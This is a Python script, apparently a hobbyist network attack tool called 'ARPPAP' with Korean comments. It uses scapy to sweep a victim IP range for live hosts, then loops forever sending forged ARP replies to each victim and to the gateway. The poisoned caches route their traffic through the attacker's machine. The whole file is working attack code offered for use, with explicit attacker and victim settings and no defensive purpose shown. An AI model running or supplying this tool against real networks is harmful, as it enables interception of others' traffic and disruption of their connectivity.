from scapy.all import *
from time import sleep
from socket import gethostname, gethostbyname

def int_to_ip(intip):
    offset = 2

    ip_addr = ''

    for idx in range(4):
        ip_addr += str(int(intip[offset+(idx*8):offset+(idx+1)*8],2))+'.'

    return ip_addr[:-1]

def get_ip_range(ip_range):
    iplist = list()

    if "/" in ip_range:

        network, subnet = ip_range.split("/")
        subnet = int(subnet)

        if subnet > 30:
            exit("Bad Prefix, Shorter then 30")

        Oct_list = [Oct if Oct.isdigit() else exit("IP is not Digit") for Oct in network.split(".")]

        bin_network = ""

        for Octet in Oct_list:
            bin_network += str(bin(int(Octet)))[2:].zfill(8)

        start_net = bin_network[:subnet]+"0"*(32-subnet)
        end_net =  bin_network[:subnet]+"1"*(32-subnet)

        for host in range(int(start_net,2)+1,int(end_net,2)):
            iplist.append(int_to_ip(bin(host)))

    else:
        return [ip_range]

    return iplist

def Banner():
    msg = """
################################################################################
#####                     A    R    P    P    A    P                       #####
################################################################################
#####                                                                      #####
#####      AAA      RRRRRR      PPPPPP     PPPPPP       AAA       PPPPPP   #####
#####     AA  A     RR   RR     PP  PPP    PP  PPP     AA  A      PP  PPP  #####
#####    AAAAAAA    RRRRRR      PPPPP      PPPPP      AAAAAAA     PPPPP    #####
#####   AA     AA   RR   RR     PP         pp        AA     AA    pp       #####
#####  AAA      AA  RR    RRR   PP         pp       AAA      AA   pp       #####
#####                                                                      #####
################################################################################
################################################################################\n"""

    print(msg)


if __name__ == "__main__":
    Banner()

    Attacker_ip = IP().src      #본인 IP'192.168.0.185'
    Attacker_mac = Ether().src  #본인 mac'00:0c:29:70:4e:4f'

    Attacker_ip = '192.168.0.185'
    Attacker_mac = '00:0c:29:70:4e:4f'

    gateway_ip = ''
    gateway_mac = ''

    Living_Mac_list = list()    # 같은 네트워크 상 현재 존재하는 맥 리스트
    ARP_BURST_TIME = 1          # ARP Spoofing 속도 (초단위)


    ########## 기본으로 세팅된 값이 맞으면 패스, N을 입력받으면 사용자 지정 설정 ############
    flag = input("\nIs Attacker Address Correct? ( {} || {} ) [ 'N' to Static Set ] - ".format(Attacker_ip,Attacker_mac))

    if flag == 'N':
        Attacker_ip = input("Set Attacker ip - ")
        Attacker_mac = input("Set Attacker mac - ")
    ###################################################################################

    victim_ip_range = input("\nVictim IP Range (ex: 192.168.0.0/24 or 192.168.0.100) - ") # 공격 대상 ip or ip 범위
    Range = get_ip_range(victim_ip_range)

    #White_List = ["192.168.0.1","192.168.0.129","192.168.0.185","192.168.0.50"]
    White_List = [Attacker_ip, gateway_ip, gethostbyname(gethostname())]    # arp spoofing 예외 대상
                                            # gethostbyname(gethostname())] 은 자기자신을 의미

    while True:
        Data = input("\nAdd White List ( 'N' to Exit ) - ") # N이라고 입력하기 전까지 예외 ip를 추가함
        if Data == 'N':
            break
        else:
            White_List.append(Data)
            print("\n==== White List =====")
            [print("[{}] {}".format(idx, ip)) for idx, ip in enumerate(White_List)]

    print("\n==== IP Range =====")
    [print("[{}] {}".format(idx, ip)) for idx, ip in enumerate(Range)]

    g_idx : int = int(input("\nWhich ip is gateway[0-253]? (-1 : custom ip) - ")) # 리스트에서 게이트웨이 주소 선택

    if g_idx == -1:
        gateway_ip = input("Input Gateway IP - ")   # 찾으려는 게이트 웨이 주소가 없을 때 수동으로 지정
    else:
        gateway_ip = Range[g_idx]

    print("Gateway IP Set : {}".format(gateway_ip)) #

    print("\n * Find Mac Addresses from Near Network... * ")

    g_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=gateway_ip)   # ARP로 게이트웨이의 mac주소를 알아내는 프레임
    sendp(g_frame, verbose=0)                                       #전송, verbose=0 은 화면에 출력 표시여부임(0은 표시 x)

    answered_packet = srp(g_frame, timeout=1, verbose=0)[0]   # 응답이 온 패킷을 answered_list에 저장
    gateway_mac = answered_packet[0][1].hwsrc                 # answered_list의 2계층 mac 정보를 gateway_mac저장

    for ip_each in Range:# Range에 있는 모든 주소를 ip_each에 저장

        if ip_each in White_List:
            print("[Except] {} in White list".format(ip_each))  # ip 범위중 예외 대상이 있을때 continue, 다음 순서 넘어감
            continue

        try:
            arp_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip_each)
            #ip_each에 저장 주소로 ARP 패킷 생성

            sendp(arp_frame, verbose=0) # arp 패킷 전송

            answered_packet = srp(arp_frame, timeout=0.01, verbose=0)[0]   # ARP로 게이트웨이의 mac주소를 알아내는 프레임

            Living_Mac_list.append([answered_packet[0][1].hwsrc, ip_each]) # 응답이 온 패킷을 Living_Mac_list에 추가
            print(Living_Mac_list[-1], "is added")

        except:
            pass

    if len(Living_Mac_list) < 1:                # 응답 온 패킷이 하나도 없을 때 종료
        exit("There is No Living Computer")

    print("\n * Start Spoofing Mac Address... *")

    while True:

        for victim_mac, victim_ip in Living_Mac_list:
            Ether_Packet = Ether(src=Attacker_mac, dst=victim_mac)
            ARP_Packet = ARP(op=2, psrc=gateway_ip, hwsrc=Attacker_mac, hwdst=victim_mac, pdst=victim_ip)  # 속일주소 상대hw, 상대ip
            sendp(Ether_Packet / ARP_Packet, verbose=0)

            print("[( {} ) {} >>>(spoofed)>>> {} ( {} )] Gateway(Spoofed) -> Victim".format(gateway_mac, gateway_ip, victim_ip, victim_mac))

            Ether_Packet = Ether(src=Attacker_mac, dst=gateway_mac)
            ARP_Packet = ARP(op=2, psrc=victim_ip, hwsrc=Attacker_mac, hwdst=gateway_mac, pdst=gateway_ip)  # 속일주소 상대hw, 상대ip
            sendp(Ether_Packet / ARP_Packet, verbose=0)
            print("[( {} ) {} <<<(spoofed)<<< {} ( {} )] Gateway <- victim(Spoofed)".format(gateway_mac, gateway_ip, victim_ip, victim_mac))

        sleep(ARP_BURST_TIME)
